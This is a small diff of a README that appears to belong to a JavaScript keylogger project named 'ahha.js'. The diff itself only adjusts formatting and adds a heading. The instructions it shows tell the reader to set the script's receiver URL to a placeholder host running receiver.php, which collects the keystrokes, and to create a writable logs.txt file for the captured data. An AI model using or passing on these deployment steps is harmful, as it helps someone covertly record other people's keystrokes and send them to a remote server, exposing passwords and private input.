@@ -1,4 +1,3 @@
-
 1. edit ahha.js, change this line to your receiver.php 
 
 mine:
@@ -10,5 +9,7 @@ yours:
 ```javascript
 var $receiver = "http://yourhost/testkeylog/receiver.php";
 ```
+
+Additional prerequisite:
 
 create logs.txt in testkeylog folder and make sure it is writable, if necessary.
